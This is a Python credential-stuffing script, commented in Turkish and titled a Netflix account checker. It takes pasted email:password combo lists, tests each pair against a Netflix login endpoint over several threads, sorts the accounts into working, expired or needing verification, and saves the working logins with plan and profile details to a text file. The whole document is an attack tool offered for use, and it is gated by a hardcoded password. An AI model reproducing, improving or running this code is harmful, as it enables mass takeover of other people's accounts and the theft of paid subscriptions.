#!/usr/bin/env python3
# KSIB NETFLIX ACCOUNT CHECKER - Çalışan API
import requests, threading, time, sys, os, json, re
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings()
init(autoreset=True)

SIFRE = "admiral71100daphne"

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n🔐 KSIB GİRİŞ\n")
    for i in range(3):
        if input(Fore.YELLOW + "> ") == SIFRE:
            return True
        print(Fore.RED + f"Hatali ({2-i})")
    sys.exit(0)

class NetflixChecker:
    def __init__(self):
        self.ok = []
        self.no = []
        self.lock = threading.Lock()
        self.done = 0
        self.list = []
    
    def bnr(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.RED + Style.BRIGHT + """
        ╔══════════════════════════════════════╗
        ║   🎬 NETFLIX ACCOUNT CHECKER       ║
        ║   📺 Plan | 👤 Profil | ⏳ Bitiş   ║
        ╚══════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def check(self, email, password):
        """Netflix hesap kontrolü"""
        try:
            s = requests.Session()
            
            # Netflix login endpoint
            url = "https://www.netflix.com/api/aui/v1/login"
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8",
                "Content-Type": "application/json",
                "Origin": "https://www.netflix.com",
                "Referer": "https://www.netflix.com/login",
            }
            
            data = {
                "userLoginId": email,
                "password": password,
                "rememberMe": "false",
                "flow": "websiteSignUp",
                "mode": "login",
                "action": "loginAction",
                "withFields": "userInfo,profiles,membershipStatus,geolocation",
                "authURL": "",
                "nextPage": "",
                "countryCode": "TR",
                "locale": "tr-TR",
            }
            
            r = s.post(url, json=data, headers=headers, timeout=15)
            
            if r.status_code == 200:
                resp = r.json()
                
                # Başarılı giriş
                if resp.get("status") == "success" or "userInfo" in resp:
                    user_info = resp.get("userInfo", {})
                    membership = resp.get("membershipStatus", {})
                    profiles = resp.get("profiles", [])
                    
                    plan = membership.get("plan", {}).get("planName", "Bilinmiyor")
                    country = user_info.get("countryOfRegistration", "?")
                    guid = user_info.get("userGuid", "?")
                    
                    # Profil sayısı
                    profile_count = len(profiles)
                    
                    # Bildirimi al
                    notification = resp.get("notification", {})
                    msg = notification.get("message", "")
                    
                    return {
                        "ok": True,
                        "plan": plan,
                        "country": country,
                        "profiles": profile_count,
                        "guid": guid[:20],
                        "msg": msg
                    }
                
                # Hata mesajı
                elif "error" in resp or resp.get("status") == "error":
                    error_msg = resp.get("message", "").lower()
                    
                    if "incorrect" in error_msg or "wrong" in error_msg:
                        return {"ok": False, "reason": "Yanlış"}
                    elif "payment" in error_msg or "membership" in error_msg:
                        return {"ok": "expired", "reason": "Süresi Bitmiş"}
                    elif "verify" in error_msg or "confirm" in error_msg:
                        return {"ok": "verify", "reason": "Doğrulama Gerekli"}
                    else:
                        return {"ok": False, "reason": error_msg[:30]}
            
            elif r.status_code == 401:
                return {"ok": False, "reason": "Yanlış"}
            elif r.status_code == 403:
                return {"ok": False, "reason": "Block"}
            else:
                return {"ok": False, "reason": f"HTTP {r.status_code}"}
                
        except Exception as e:
            return {"ok": False, "reason": str(e)[:30]}
    
    def worker(self, tid):
        while self.done < len(self.list):
            with self.lock:
                if self.done >= len(self.list): break
                i = self.done
                self.done += 1
            
            u, p = self.list[i]["user"], self.list[i]["pass"]
            r = self.check(u, p)
            
            with self.lock:
                if r["ok"] == True:
                    self.ok.append({"u": u, "p": p, **r})
                    print(Fore.GREEN + f"  ✅ [{self.done}/{len(self.list)}] {u}")
                    print(Fore.WHITE + f"     📺 {r.get('plan','?')} | 👤 {r.get('profiles',0)} profil | 🌍 {r.get('country','?')}")
                    
                elif r["ok"] == "expired":
                    self.no.append({"u": u, "r": "Süresi Bitmiş"})
                    print(Fore.YELLOW + f"  ⚠️  [{self.done}/{len(self.list)}] {u} - Süresi bitmiş")
                    
                elif r["ok"] == "verify":
                    self.no.append({"u": u, "r": "Doğrulama"})
                    print(Fore.MAGENTA + f"  🔒 [{self.done}/{len(self.list)}] {u} - Doğrulama gerekli")
                    
                else:
                    self.no.append({"u": u, "r": r.get("reason","?")})
                    if self.done % 5 == 0:
                        print(Fore.RED + f"  ❌ [{self.done}/{len(self.list)}] Kontrol ediliyor... (✅{len(self.ok)})")
                
                if self.done % 10 == 0:
                    elapsed = time.time() - self.st
                    rate = self.done / elapsed if elapsed > 0 else 0
                    eta = (len(self.list) - self.done) / rate if rate > 0 else 0
                    print(Fore.CYAN + f"\n  📊 {self.done}/{len(self.list)} | ✅{len(self.ok)} | ❌{len(self.no)} | ⚡{rate:.1f}/s | ⏳{eta:.0f}s\n")
            
            time.sleep(0.3)
    
    def start(self, th=5):
        if not self.list:
            print(Fore.RED + "Liste bos!")
            return
        
        print(Fore.CYAN + f"\n🎬 {len(self.list)} hesap kontrol ediliyor...\n")
        
        self.st = time.time()
        tl = []
        for i in range(th):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            tl.append(t)
        
        try:
            for t in tl: t.join()
        except KeyboardInterrupt:
            pass
        
        self.sonuc()
    
    def sonuc(self):
        elapsed = time.time() - self.st
        total = len(self.list)
        
        print("\n\n" + "="*60)
        print(Fore.GREEN + Style.BRIGHT + "📊 NETFLIX SONUÇ RAPORU")
        print("="*60)
        print(f"⏱️  {elapsed:.1f}s | 📨 {total}")
        print(f"✅ Çalışan: {len(self.ok)}")
        
        expired = sum(1 for d in self.no if d.get("r") == "Süresi Bitmiş")
        verify = sum(1 for d in self.no if d.get("r") == "Doğrulama")
        wrong = len(self.no) - expired - verify
        
        print(f"⚠️  Süresi Bitmiş: {expired}")
        print(f"🔒 Doğrulama: {verify}")
        print(f"❌ Yanlış: {wrong}")
        
        if total > 0:
            print(f"📈 Başarı: %{len(self.ok)/total*100:.1f}")
        print("="*60)
        
        if self.ok:
            print(Fore.YELLOW + f"\n🎯 ÇALIŞAN HESAPLAR ({len(self.ok)}):")
            print(Fore.YELLOW + "-"*60)
            
            for i, a in enumerate(self.ok, 1):
                print(Fore.GREEN + f"\n  [{i}] {a['u']}:{a['p']}")
                print(Fore.WHITE + f"     📺 Plan: {a.get('plan','?')}")
                print(Fore.WHITE + f"     👤 Profil: {a.get('profiles',0)} adet")
                print(Fore.WHITE + f"     🌍 Ülke: {a.get('country','?')}")
                if a.get('msg'):
                    print(Fore.CYAN + f"     💬 {a['msg'][:50]}")
            
            # Kaydet
            with open("netflix_working.txt", "w") as f:
                for a in self.ok:
                    f.write(f"{a['u']}:{a['p']} | {a.get('plan','?')} | {a.get('profiles',0)} profil\n")
            print(Fore.GREEN + "\n💾 netflix_working.txt")
        
        if expired:
            print(Fore.YELLOW + f"\n⚠️  SÜRESİ BİTMİŞ ({expired}):")
            for d in self.no:
                if d.get("r") == "Süresi Bitmiş":
                    print(Fore.YELLOW + f"  • {d['u']}")
        
        print(Fore.YELLOW + "\n" + "="*60 + "\n")

def ana():
    giris()
    nf = NetflixChecker()
    nf.bnr()
    
    while True:
        print(Fore.YELLOW + "\n🎬 NETFLIX CHECKER MENÜ:")
        print(f"1. ✍️  Combo Gir (Şu an: {len(nf.list)} hesap)")
        print("2. 🚀 Kontrolü Başlat")
        print("3. 🔍 Tek Hesap Kontrol")
        print("4. 🚪 Çıkış")
        
        sec = input(Fore.GREEN + "\n> ").strip()
        
        if sec == "1":
            print(Fore.YELLOW + "\n✍️  Combo listeyi yapıştır (email:pass):")
            print(Fore.CYAN + "Her satıra bir hesap, bitince boş Enter\n")
            
            print(Fore.WHITE + "┌─ Combo Listesi ─┐")
            lines = []
            while True:
                line = input(Fore.WHITE + "│ " + Fore.GREEN).strip()
                if not line: break
                if ':' in line and '@' in line:
                    u, p = line.split(':', 1)
                    lines.append({"user": u.strip(), "pass": p.strip()})
            print(Fore.WHITE + "└─────────────────┘")
            
            if lines:
                nf.list = lines
                print(Fore.GREEN + f"\n✅ {len(lines)} hesap eklendi!")
                for i, x in enumerate(lines[:5], 1):
                    print(Fore.WHITE + f"  [{i}] {x['user']}")
                if len(lines) > 5:
                    print(Fore.WHITE + f"  ... +{len(lines)-5}")
            
            input(Fore.YELLOW + "\nEnter...")
            nf.bnr()
        
        elif sec == "2":
            if not nf.list:
                print(Fore.RED + "\n❌ Önce combo gir!")
                input("Enter...")
                nf.bnr()
                continue
            
            th = int(input(Fore.GREEN + "\n🧵 Thread (5): ") or "5")
            
            if input(Fore.GREEN + "🚀 Başlat? (E): ").upper() == "E":
                nf.ok, nf.no, nf.done = [], [], 0
                nf.start(th)
                nf.list = []
                input(Fore.YELLOW + "\nEnter...")
                nf.bnr()
        
        elif sec == "3":
            print(Fore.YELLOW + "\n🔍 TEK HESAP KONTROL:")
            email = input(Fore.GREEN + "📧 Email: ").strip()
            pwd = input(Fore.GREEN + "🔑 Şifre: ").strip()
            
            if email and pwd:
                print(Fore.CYAN + "\nKontrol ediliyor...")
                r = nf.check(email, pwd)
                
                if r["ok"] == True:
                    print(Fore.GREEN + f"\n✅ ÇALIŞIYOR!")
                    print(Fore.WHITE + f"📺 Plan: {r.get('plan','?')}")
                    print(Fore.WHITE + f"👤 Profil: {r.get('profiles',0)}")
                    print(Fore.WHITE + f"🌍 Ülke: {r.get('country','?')}")
                elif r["ok"] == "expired":
                    print(Fore.YELLOW + "\n⚠️ Süresi bitmiş!")
                else:
                    print(Fore.RED + f"\n❌ {r.get('reason','Bilinmiyor')}")
            
            input(Fore.YELLOW + "\nEnter...")
            nf.bnr()
        
        elif sec == "4":
            print(Fore.GREEN + "\n👋 Hoşçakal!")
            break

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Çıkış!")
        sys.exit(0)
